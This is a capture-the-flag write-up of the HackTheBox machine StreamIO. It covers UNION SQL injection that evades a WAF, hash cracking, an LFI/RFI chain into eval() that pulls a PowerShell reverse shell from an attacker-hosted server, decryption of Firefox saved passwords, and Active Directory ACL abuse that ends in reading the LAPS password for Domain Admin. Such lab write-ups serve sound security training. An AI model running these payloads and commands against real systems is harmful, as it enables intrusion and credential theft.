---
title: "StreamIO - HackTheBox Writeup"
date: 2026-05-08
tags: [HTB, Windows, Medium, MSSQL, SQLi, UNION, LFI, RFI, RCE, LAPS, BloodHound, Active Directory]
image: /assets/img/posts/streamio/banner.png

---

# StreamIO — HackTheBox (Medium)

StreamIO was a medium rated Windows box, but honestly it felt somewhere between medium and hard, and it was **very** lengthy. The attack chain goes: SQL injection on a movie search page → credential dumping → LFI/RFI to RCE → lateral movement through Firefox saved passwords → AD ACL abuse via WriteOwner → LAPS password read → Domain Admin.

Let's get into it.

---

## Reconnaissance

### Nmap

Starting with the usual full port scan:

```bash
$ nmap 10.129.29.195 -p- -vv -oN nmap/streamio-open-ports
```

```
PORT      STATE SERVICE          REASON
53/tcp    open  domain           syn-ack ttl 127
80/tcp    open  http             syn-ack ttl 127
88/tcp    open  kerberos-sec     syn-ack ttl 127
135/tcp   open  msrpc            syn-ack ttl 127
139/tcp   open  netbios-ssn      syn-ack ttl 127
389/tcp   open  ldap             syn-ack ttl 127
443/tcp   open  https            syn-ack ttl 127
445/tcp   open  microsoft-ds     syn-ack ttl 127
464/tcp   open  kpasswd5         syn-ack ttl 127
593/tcp   open  http-rpc-epmap   syn-ack ttl 127
636/tcp   open  ldapssl          syn-ack ttl 127
3268/tcp  open  globalcatLDAP    syn-ack ttl 127
3269/tcp  open  globalcatLDAPssl syn-ack ttl 127
5985/tcp  open  wsman            syn-ack ttl 127
9389/tcp  open  adws             syn-ack ttl 127
```

TTL 127 confirms Windows. Kerberos, LDAP, DNS — this is a Domain Controller. Running a detailed scan on the interesting ports:

```bash
$ nmap -p53,80,88,135,139,389,443,445,464,593,636,3268,3269,5985,9389 10.129.29.195 -sC -sV -A -oN nmap/streamio-detailed-scan -vv
```

Key findings:

```
80/tcp    open  http          Microsoft IIS httpd 10.0
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: streamIO.htb)
443/tcp   open  ssl/https
| ssl-cert: Subject: commonName=streamIO/countryName=EU
| Subject Alternative Name: DNS:streamIO.htb, DNS:watch.streamIO.htb
```

The SSL certificate SAN is leaking a vhost: `watch.streamIO.htb`. Added both `streamIO.htb` and `watch.streamIO.htb` to `/etc/hosts`.

### DNS Enumeration

```bash
$ dig ANY streamio.htb @streamio.htb
```

```
streamio.htb.     600   IN  A     10.129.29.195
streamio.htb.     3600  IN  NS    dc.streamio.htb.
streamio.htb.     3600  IN  SOA   dc.streamio.htb. hostmaster.streamio.htb. ...
```

The NS record `dc.streamio.htb` confirms this is the DC. Zone transfers failed, and subdomain brute-forcing returned SERVFAIL — the DNS server wasn't cooperating. Nothing beyond what the SSL cert already gave us.

### SMB / RPC / LDAP — NULL Sessions

Tried NULL authentication against all three. No luck:

```bash
$ rpcclient -U '' -N streamIO.htb
Cannot connect to server.  Error was NT_STATUS_ACCESS_DENIED

$ smbclient -L //streamio.htb -N
session setup failed: NT_STATUS_ACCESS_DENIED

$ ldapsearch -x -H ldap://streamIO.htb -b '' -s base namingContexts
```

LDAP base query worked and confirmed the domain DN:

```
namingContexts: DC=streamIO,DC=htb
```

But nothing else without creds. Moving on to web.

---

## Web Enumeration

### Port 80

Default IIS landing page. Nothing here.

### Port 443 — streamIO.htb

Gobuster on the HTTPS vhost:

```bash
$ gobuster dir -k -u https://streamio.htb/ -w ~/share/SecLists/Discovery/Web-Content/quickhits.txt
```

```
admin/               (Status: 403) [Size: 18]
login.php            (Status: 200) [Size: 4145]
register.php         (Status: 200) [Size: 4500]
```

The site is a movie streaming service running PHP on IIS. The `/admin/` endpoint exists but returns 403 — needs authentication. The About page reveals some potential usernames:

```
oliver@streamio.htb
barry@streamio.htb
samantha@streamio.htb
Johan
```

Noted these for later. The login page has a registration function, but registering an account doesn't give access to `/admin/`. Time to get aggressive.

### Port 443 — watch.streamIO.htb

This vhost has a movie search functionality with a `q` parameter. Interesting.

---

## SQL Injection

### Discovery — Login Page (Stacked Queries)

Saved the login POST request from Burp and fed it to sqlmap:

```bash
$ cat login.req
POST /login.php HTTP/1.1
Host: streamio.htb
Content-Type: application/x-www-form-urlencoded
Cookie: PHPSESSID=ugm8gfta4ph0kigabu96lis84i

username=slayer&password=password
```

```bash
$ sqlmap -r login.req --force-ssl --batch --level 3 --risk 3
```

```
Parameter: username (POST)
    Type: stacked queries
    Title: Microsoft SQL Server/Sybase stacked queries (comment)
    Payload: username=slayer';WAITFOR DELAY '0:0:5'--&password=password
```

Stacked queries on MSSQL — the most powerful injection type. But since the login page doesn't display query output, sqlmap falls back to time-based blind extraction. That's 1 byte per ~6 requests, each with a 5-second delay. Painfully slow.

Enumerated the databases:

```bash
$ sqlmap -r login.req --force-ssl --batch --dbs
```

```
available databases [5]:
[*] model
[*] msdb
[*] STREAMIO
[*] streamio_backup
[*] tempdb
```

The backup database will be relevant later. But dumping via time-based blind was going to take forever, so I switched to the search page on `watch.streamIO.htb`.

### UNION Injection — Search Page




The search page was a much better injection point. First, I tested what keywords the WAF was blocking:

```bash
$ curl -sk -o /dev/null -w "%{http_code}" -X POST https://watch.streamio.htb/search.php -d "q=union"    # 200
$ curl -sk -o /dev/null -w "%{http_code}" -X POST https://watch.streamio.htb/search.php -d "q=select"   # 200
$ curl -sk -o /dev/null -w "%{http_code}" -X POST https://watch.streamio.htb/search.php -d "q=order"    # 302 → blocked
$ curl -sk -o /dev/null -w "%{http_code}" -X POST https://watch.streamio.htb/search.php -d "q=waitfor"  # 302 → blocked
$ curl -sk -o /dev/null -w "%{http_code}" -X POST https://watch.streamio.htb/search.php -d "q=null"     # 302 → blocked
```

`order`, `waitfor`, and `null` are blocked, but `union` and `select` are allowed. Since `NULL` is blocked, I used integers instead. Finding the column count:

```bash
$ for i in 1 2 3 4 5 6; do
    cols=$(seq -s, 1 $i)
    echo "--- $i columns ---"
    curl -sk -X POST https://watch.streamio.htb/search.php -d "q=test' union select $cols--" | wc -c
done
```

```
--- 1 columns --- 1031
--- 2 columns --- 1031
--- 3 columns --- 1031
--- 4 columns --- 1031
--- 5 columns --- 1031
--- 6 columns --- 1296
```

6 columns — the larger response at 6 means data came back. Checking which columns render:

```bash
$ curl -sk -X POST https://watch.streamio.htb/search.php -d "q=test' UNION select 1,2,3,4,5,6-- -" | grep -A5 "movie"
```

```html
<div class="d-flex movie align-items-end">
    <div class="mr-auto p-2">
        <h5 class="p-2">2</h5>
    </div>
    <div class="ms-auto p-2">
        <span class="">3</span>
```

Column 2 renders as the movie title, column 3 as the year. But column 3 seems to expect a numeric type — strings get dropped. So I used string concatenation to put both username and password hash into column 2:

### Dumping Credentials

First, confirming the database and enumerating tables:

```bash
$ curl -sk -X POST https://watch.streamio.htb/search.php \
  -d "q=test' UNION select 1,@@version,3,4,5,6-- -"
```


```bash
$ curl -sk -X POST https://watch.streamio.htb/search.php \
  -d "q=test' UNION SELECT 1,name,3,4,5,6 FROM STREAMIO..sysobjects WHERE xtype='U'-- -"
```

Tables found: `movies`, `users`. Dumping the users table:

```bash
$ curl -sk -X POST https://watch.streamio.htb/search.php \
  -d "q=test' UNION SELECT 1,username+':'+password,3,4,5,6 FROM STREAMIO..users-- -"
```

30 users with MD5 hashes came back instantly. No more waiting around for time-based blind. Cleaned up the output:

```
admin:665a50ac9eaa781e4f7f04199db97a11
Alexendra:1c2b3d8270321140e5153f6637d3ee53
Austin:0049ac57646627b8d7aeaccf8b6a936f
Barry:54c88b2dbd7b1a84012fabc1a4c73415
Bruno:2a4e2cf22dd8fcb45adcb91be1e22ae8
Clara:ef8f3d30a856cf166fb8215aca93e9ff
...
yoshihide:b779ba15cedfd22a023c4d8bcf5f2332
```

### Cracking the Hashes

Fed all 30 MD5 hashes to hashcat on my RTX 4070 Super:

```powershell
PS> .\hashcat.exe -m 0 .\hashes\streamio_hashes.txt .\wordlists\rockyou.txt -d 2
```

12/30 cracked in under a second. 39 million keys/sec — gotta love GPU cracking.

```
Lauren:##123a8j8w5123##
Clara:%$clara
admin:paddpadd
Juliette:$3xybitch
Barry:$hadoW
Bruno:$monique$1991$
Lenord:physics69i
Michelle:!?Love?!123
Sabrina:!!sabrina$
Thane:highschoolmusical
Victoria:!5psycho8!
yoshihide:66boysandgirls..
```

---

## Web Application — Admin Access

Sprayed the cracked passwords against the login page. `yoshihide:66boysandgirls..` got in and had access to `/admin/`:

```bash
$ curl -sk -X POST https://streamio.htb/login.php \
  -d 'username=yoshihide&password=66boysandgirls..' -c cookies.txt

$ curl -sk -b cookies.txt https://streamio.htb/admin/
```

The admin panel had management pages for users, staff, and movies. Fuzzing the admin endpoint for parameters:

```bash
$ ffuf -u "https://streamio.htb/admin/?FUZZ=" \
  -w ~/share/SecLists/Discovery/Web-Content/burp-parameter-names.txt \
  -b "PHPSESSID=<session>" -fs 1782
```

Found `debug` as a hidden parameter.

### LFI to Source Code Disclosure

Requesting `?debug=index.php` returned `---- ERROR ----` — the page was trying to include itself and choking. This confirmed the parameter is including files. Using PHP filters to base64-encode the source before inclusion:

```bash
$ curl -sk -b cookies.txt \
  "https://streamio.htb/admin/?debug=php://filter/convert.base64-encode/resource=master.php" \
  | grep -o '[A-Za-z0-9+/=]\{50,\}' | base64 -d
```

This bypasses execution by encoding the PHP before `include()` processes it. The decoded `master.php` source revealed something beautiful at the bottom:

```php
if(isset($_POST['include']))
{
    if($_POST['include'] !== "index.php" )
        eval(file_get_contents($_POST['include']));
    else
        echo(" ---- ERROR ---- ");
}
```

`file_get_contents()` fetching from a user-controlled URL → RFI. The result fed into `eval()` → RCE. Game on.

### RFI → RCE → Reverse Shell

Since `eval()` executes raw PHP without tags, the payload is clean:

```bash
$ echo 'system("powershell -e <base64_encoded_reverse_shell>");' > revshell.php
$ python3 -m http.server 8000
```

Triggering the RFI through the `include` POST parameter (going through `?debug=master.php` so the `included` constant is defined):

```bash
$ curl -sk -b cookies.txt -X POST \
  "https://streamio.htb/admin/?debug=master.php" \
  -d "include=http://10.10.15.45:8000/revshell.php"
```

```
$ nc -lvnp 6969
Connection from 10.129.30.69:54540
PS C:\inetpub\streamio.htb\admin> whoami
streamio\yoshihide
```

We're on the box as yoshihide.

---

## Lateral Movement — yoshihide → nikk37

### Harvesting Database Credentials

Reading the PHP source files on disk revealed hardcoded database credentials:

| File | User | Password |
|------|------|----------|
| `login.php` | `db_user` | `B1@hB1@hB1@h` |
| `admin/index.php` | `db_admin` | `B1@hx31234567890` |

### Backup Database Enumeration

Remember that `streamio_backup` database from the sqlmap enumeration earlier? With `db_admin` creds, I could now query it directly:

```powershell
PS> sqlcmd -S localhost -U db_admin -P 'B1@hx31234567890' -Q "SELECT username,password FROM streamio_backup.dbo.users"
```

```
username        password
----------      ----------------------------------
nikk37          389d14cb8e4e9b94b137deb1caf0612a
yoshihide       b779ba15cedfd22a023c4d8bcf5f2332
James           c660060492d9edcaa8332d89c99c9239
Theodore        925e5408ecb67aea449373d668b7359e
Samantha        083ffae904143c4796e464dac33c1f7d
Lauren          08344b85b329d7efd611b7a7743e8a09
William         d62be0dc82071bccc1322d64ec5b6c51
Sabrina         f87d3c0d6c8fd686aacc6627f1f493a5
```

Comparing against the live database — most hashes were identical. But `nikk37` was only in the backup, not in the live DB. Their account had been removed from production but the credentials lingered in the backup.

Cracked it:

```powershell
PS> .\hashcat.exe -m 0 "389d14cb8e4e9b94b137deb1caf0612a" .\wordlists\rockyou.txt -d 2

389d14cb8e4e9b94b137deb1caf0612a:get_dem_girls2@yahoo.com
```

Tested against WinRM:

```bash
$ netexec winrm streamIO.htb -u nikk37 -p 'get_dem_girls2@yahoo.com'
WINRM  10.129.30.69  5985  DC  [+] streamIO.htb\nikk37:get_dem_girls2@yahoo.com (Pwn3d!)
```

```bash
$ evil-winrm -i streamIO.htb -u nikk37 -p 'get_dem_girls2@yahoo.com'
```

**User flag obtained.**

---

## Lateral Movement — nikk37 → JDgodd

### Firefox Saved Credentials

Running WinPEAS on the box flagged Firefox credential files in nikk37's profile:

```
C:\Users\nikk37\AppData\Roaming\Mozilla\Firefox\Profiles\br53rxeg.default-release\key4.db
C:\Users\nikk37\AppData\Roaming\Mozilla\Firefox\Profiles\br53rxeg.default-release\logins.json
```

Downloaded both to my Kali box and decrypted them with firepwd:

```bash
$ git clone https://github.com/lclevy/firepwd.git
$ cd firepwd
$ python firepwd.py -d ../firefox-creds/
```

```
decrypting login/password pairs
Using 3DES (32-byte key, truncated to 24)
https://slack.streamio.htb:b'admin',b'JDg0dd1s@d0p3cr3@t0r'
https://slack.streamio.htb:b'nikk37',b'n1kk1sd0p3t00:)'
https://slack.streamio.htb:b'yoshihide',b'paddpadd@12'
https://slack.streamio.htb:b'JDgodd',b'password@12'
```

Four sets of credentials from a Slack instance. Also reveals another vhost — `slack.streamio.htb`. Spraying these against SMB:

```bash
$ netexec smb streamIO.htb -u firefox-users -p firefox-passwds --continue-on-success
SMB  10.129.30.69  445  DC  [+] streamIO.htb\JDgodd:JDg0dd1s@d0p3cr3@t0r
```

JDgodd's creds are valid on the domain. No WinRM access though, and only basic share read permissions:

```bash
$ netexec smb streamio.htb -u JDgodd -p 'JDg0dd1s@d0p3cr3@t0r' --shares
Share           Permissions     Remark
-----           -----------     ------
ADMIN$                          Remote Admin
C$                              Default share
IPC$            READ            Remote IPC
NETLOGON        READ            Logon server share
SYSVOL          READ            Logon server share
```

Time for BloodHound.

---

## Privilege Escalation — ACL Abuse → LAPS → Domain Admin

### BloodHound Collection

```bash
$ bloodhound-python -u JDgodd -p 'JDg0dd1s@d0p3cr3@t0r' -d streamIO.htb -ns 10.129.30.69 -c All
```

Imported the JSON files into BloodHound and marked JDgodd as owned. Checking "Shortest Paths from Owned Principals" revealed a clean three-hop path to DA.

JDgodd had **WriteOwner** on the "Core Staff" group. That's huge — owning an AD object lets you modify its DACL, which means you can grant yourself whatever permissions you want on it. So the play was: take ownership, give myself GenericAll, then add JDgodd as a member of Core Staff.

The reason Core Staff mattered was because it had **ReadLAPSPassword** on `dc.streamio.htb`. LAPS auto-rotates the local Administrator password and stores it in an AD attribute (`ms-MCS-AdmPwd`). Only principals with that specific permission can read it — and since this machine *is* the DC, reading the local admin password is basically game over.

### Executing the Attack

```bash
# Take ownership of Core Staff (JDgodd was already the owner)
$ bloodyAD -d streamIO.htb -u JDgodd -p 'JDg0dd1s@d0p3cr3@t0r' \
  --host 10.129.30.69 set owner 'core staff' JDgodd
[!] S-1-5-21-1470860369-1569627196-4264678630-1104 is already the owner

# Grant GenericAll on the group
$ bloodyAD -d streamIO.htb -u JDgodd -p 'JDg0dd1s@d0p3cr3@t0r' \
  --host 10.129.30.69 add genericAll 'core staff' JDgodd
[+] JDgodd has now GenericAll on core staff

# Add JDgodd to Core Staff
$ bloodyAD -d streamIO.htb -u JDgodd -p 'JDg0dd1s@d0p3cr3@t0r' \
  --host 10.129.30.69 add groupMember 'core staff' JDgodd
[+] JDgodd added to core staff

# Read LAPS password
$ bloodyAD -d streamIO.htb -u JDgodd -p 'JDg0dd1s@d0p3cr3@t0r' \
  --host 10.129.30.69 get search --filter '(ms-MCS-AdmPwd=*)' --attr ms-MCS-AdmPwd

distinguishedName: CN=DC,OU=Domain Controllers,DC=streamIO,DC=htb
ms-Mcs-AdmPwd: B/E]6!!9Jh8!3{
```

### Shell as Administrator

```bash
$ evil-winrm -i streamIO.htb -u Administrator -p 'B/E]6!!9Jh8!3{'

*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
streamio\administrator
```

**Root flag obtained. GGs!**

---

## Summary

StreamIO was a medium rated Windows box, but it felt somewhere between medium and hard — and it was VERY lengthy indeed. Starting with basic nmap enumeration, the SSL certificate on 443 leaked the vhost `watch.streamIO.htb`, and DNS enumeration confirmed this was a Domain Controller.

NULL sessions against SMB, LDAP, and RPC gave us nothing. Enumerating the web servers revealed a movie streaming service with a PHP-based login, the `/admin/` endpoint (403 — needed auth), and a search page on the watch vhost.

The search page's `q` parameter was vulnerable to UNION-based SQL injection. After working around a WAF that blocked `order`, `waitfor`, and `null` keywords, I enumerated the MSSQL backend, found the STREAMIO database, and dumped 30 MD5 hashes from the users table. Cracked 12 of them and authenticated as yoshihide.

Fuzzing the admin panel's parameters revealed a `debug` parameter vulnerable to LFI. Using PHP filters to read the source code, I found that `master.php` had a POST parameter `include` that fed into `eval(file_get_contents(...))` — RFI straight to RCE. Hosted a reverse shell payload and caught a shell as yoshihide.

From there, hardcoded database credentials in the PHP source files gave access to the `streamio_backup` database, which contained a hash for nikk37 that wasn't in the live database. Cracked it to `get_dem_girls2@yahoo.com` — valid for WinRM. User flag.

Firefox saved passwords in nikk37's profile gave us JDgodd's domain credentials. BloodHound revealed JDgodd had WriteOwner on the Core Staff group, which had ReadLAPSPassword on the DC. Classic ACL abuse chain: take ownership → GenericAll → add to group → read LAPS password → admin shell. Root.

Defensively, none of these individual permissions look dangerous in isolation. WriteOwner on a staff group? Normal HR delegation. ReadLAPSPassword for an IT ops group? Standard. But chained together they go straight to Domain Admin — exactly the kind of thing BloodHound was built to catch. Also: don't leave backup databases with stale credentials lying around. Stale credentials are still valid credentials.